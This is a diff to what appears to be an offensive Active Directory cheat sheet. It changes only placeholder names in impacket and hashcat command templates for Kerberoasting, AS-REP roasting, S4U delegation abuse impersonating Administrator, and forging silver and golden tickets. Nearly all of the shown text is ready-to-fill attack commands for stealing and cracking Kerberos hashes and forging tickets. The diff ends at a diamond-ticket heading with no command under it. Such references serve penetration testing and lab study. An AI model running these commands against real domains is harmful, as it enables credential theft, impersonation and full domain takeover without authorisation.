@@ -15,13 +15,13 @@ hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 
 ## Kerberoast with no-preauth user
 ```
-GetUserSPNs.py -request -no-preauth <no-preauth_user> -usersfile <usersfile|users.txt> -outputfile hashes.kerberoast <domain>/
+GetUserSPNs.py -request -no-preauth <no_preauth_user> -usersfile <userlist|users.txt> -outputfile hashes.kerberoast <domain>/
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 ```
 
 ## ASREPRoast with usersfile
 ```
-GetNPUsers.py -usersfile <usersfile|users.txt> -outputfile hashes.asreproast <domain>/
+GetNPUsers.py -usersfile <userlist|users.txt> -outputfile hashes.asreproast <domain>/
 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 ```
 
@@ -33,27 +33,27 @@ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 
 ## KCD/RBCD (principal requires SPN!)
 ```
-getST.py -spn <service|cifs>/<fqdn> -impersonate <imp_acc|administrator> <domain>/'<user>'<impacket_auth>
+getST.py -spn <service|cifs>/<fqdn> -impersonate <imp_user|Administrator> <domain>/'<user>'<impacket_auth>
 ```
 
 ## s4u2self
 ```
-getST.py -self -altservice <service|cifs>/<fqdn> -impersonate <imp_acc|administrator> <domain>/'<user>'<impacket_auth>
+getST.py -self -altservice <service|cifs>/<fqdn> -impersonate <imp_user|Administrator> <domain>/'<user>'<impacket_auth>
 ```
 
 ## s4u2proxy
 ```
-getST.py -spn <service|cifs>/<fqdn> -additional-ticket <ticket_file> -impersonate <imp_acc|administrator> <domain>/'<user>'<impacket_auth>
+getST.py -spn <service|cifs>/<fqdn> -additional-ticket <ticket_file> -impersonate <imp_user|Administrator> <domain>/'<user>'<impacket_auth>
 ```
 
 ## ticketer silver ticket
 ```
-ticketer.py -nthash <service_nthash> -domain-sid <domain_sid> -domain <domain> -spn <spn> '<user>'
+ticketer.py -nthash <service_nt_hash> -domain-sid <domain_sid> -domain <domain> -spn <spn> '<user>'
 ```
 
 ## ticketer golden ticket
 ```
-ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain <domain> '<user>'
+ticketer.py -nthash <krbtgt_nt_hash> -domain-sid <domain_sid> -domain <domain> '<user>'
 ```
 
 ## ticketer diamond ticket
